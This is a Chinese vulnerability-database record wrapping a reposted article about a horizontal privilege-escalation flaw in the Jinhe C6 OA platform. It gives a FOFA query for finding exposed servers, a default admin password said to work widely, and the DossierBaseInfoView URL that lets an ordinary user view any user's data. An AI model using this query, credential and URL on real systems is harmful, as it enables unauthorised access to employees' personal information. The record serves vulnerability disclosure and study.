---
source: "MrWQ/vulnerability-paper"
title: "金和C6 DossierBaseInfoView UserID水平越权"
product: "金和C6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: "CVE-2021-1732"
identifier_status: "unknown"
affected_scope: "2021最新版无build"
prerequisites: "普通用户登录"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%87%91%E5%92%8COA/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%EF%BC%88%E9%80%9A%E7%94%A8%200day%EF%BC%89%E9%87%91%E5%92%8C%20C6%20%E5%8D%8F%E5%90%8C%20OA%20%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.md"
id: "vw-97b213945a4d0944c4e7dcda"
entity_id: "ve-97b213945a4d0944c4e7dcda"
schema_version: "1"
---

# 金和C6 DossierBaseInfoView UserID水平越权

## 条目说明

- 对象与具体问题：金和C6；DossierBaseInfoView UserID水平越权
- 版本、配置及部署条件：2021最新版无build
- 认证与权限前提：普通用户登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 普通用户与管理员对照明确，但实际权限策略/字段敏感性只图
- 默认admin口令与其他账号弱口令是另问题，不应当越权必需条件
- 0day缺原始日期/修复，推广CVE1732不是主漏洞

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA)

_**前言**_

  

此漏洞是由 **goddmeon** 师傅挖掘并授权发表。  

在此感谢 **goddmeon** 师傅。

**申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，****切勿用于它用途！**

_**Part.1 漏洞背景**_

  

C6 是金和软件拥有自主知识产权的、基于 Web 的企业级协同管理平台软件系统。

  

_**Part.2 漏洞描述**_

  

北京金和网络股份有限公司 C6 协同管理平台存在后台水平越权漏洞，可直接访问任意 ID 用户信息。

  

_**Part.3 漏洞影响**_

  

最新版 C6 协同管理平台  
金和软件 ©2021

  

_**Part.4 FoFa 语法**_

  

```
body="金和协同管理平台" && country="CN"
```

  

_**Part.5 漏洞复现**_

  

该 OA 系统存在一个默认的口令  

```
admin / 000000
```

不仅是 admin 用户，目前发现很多账户都存在这个弱密码，当然要知道登录账号名，才能批量测试。  
后台登录水平越权  
**漏洞 url:**  

```
C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=想要的id用户
这个id指的是用户编号
```

以 admin 用户登录 OA 系统

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGb6h2wfSiaHLBsDfhSUAUnPiceKhvpAKNmucibdtvW0QEtLqRXOL2WR5aPdXb7ewKyibmmuE654s0urJA/640?wx_fmt=png)

查看用户管理，看到用户编号 0001 为董事长

为了验证水平越权漏洞，我们登录一个普通用户账号，下面是普通用户登录后的界面。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGb6h2wfSiaHLBsDfhSUAUnPickzDydFrH99gX0Pfib1A4sFiba4hoqGXaJAeb2fLW1GkhEH7NUhxtdrhQ/640?wx_fmt=png)

访问 url:

```
http://www.xxxxxxx.net/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=0001
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGb6h2wfSiaHLBsDfhSUAUnPicnvsic9B6Y5rFzbNVUeDsglXuicuyIRicrnJMia921vEHzI5PEh6qIAqsRA/640?wx_fmt=png)

以普通用户权限查看用户编号 0001 的用户信息，复现成功。

  

![](https://mmbiz.qpic.cn/mmbiz_gif/z1BDHniaudwlfmWtOG25nMTy7Rm8fr8FiaZGaNFeOjQK1wfqWpcrZc3TPvRmyYN2r2qC8JFGuMFEXobVMYp9hQzQ/640?wx_fmt=gif)

扫码二维码

获取更多知识

F12sec

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGZjT4wKhhUiaY0Vfb11FayFhDumgDvFHln8q6rttXdllugQU7ibcLLOxp5H581iayytcnXEPwibEO8yqw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/eHpJZ2bXAXdly9aB5q6xe9xjE66TzF3GbwhdOYtfUyyejGYeOcS7L6yn8WP1LflIANPiafT4h0kghD7MGhJkqAA/640?wx_fmt=png)

  

往期推荐  

[实战 | 记一次利用 mssql 上线](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484628&idx=1&sn=2345aec9a4550a194dc5a28b0c5cd496&chksm=c07fbf20f708363614e51e5525c1aad9b4c8f5a50b391b0c83f11d1073a26d7bb8f4dc3a9fc8&scene=21#wechat_redirect)  
[漏洞复现 | 某系统通用（0day）](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484741&idx=1&sn=62989d6b4d1540a8ec829f665e42e033&chksm=c07fbeb1f70837a7577a86d3687a8c8fa177eb5115e14b7fe0727b80021baaad6378b3a62c76&scene=21#wechat_redirect)  

[实战 | 利用无线渗透加内网渗透进行钓妹子 (上篇)](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484701&idx=1&sn=39a82092e0c16d219b50d5ecd1274674&chksm=c07fbee9f70837ffe6f35b87bea98da39379b1e94d5cb4ce0cbc18c2b008b1bcef20954aefb6&scene=21#wechat_redirect)

[漏洞复现 | Microsoft Windows10 本地提权漏权 CVE-­2021­-1732](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484765&idx=1&sn=c454dc78e4340bcaae2f6cc1f7d944fa&chksm=c07fbea9f70837bf68bf4b37358bdbf9affb87e5fb077e55db2136da53303b697b96ead5ce10&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
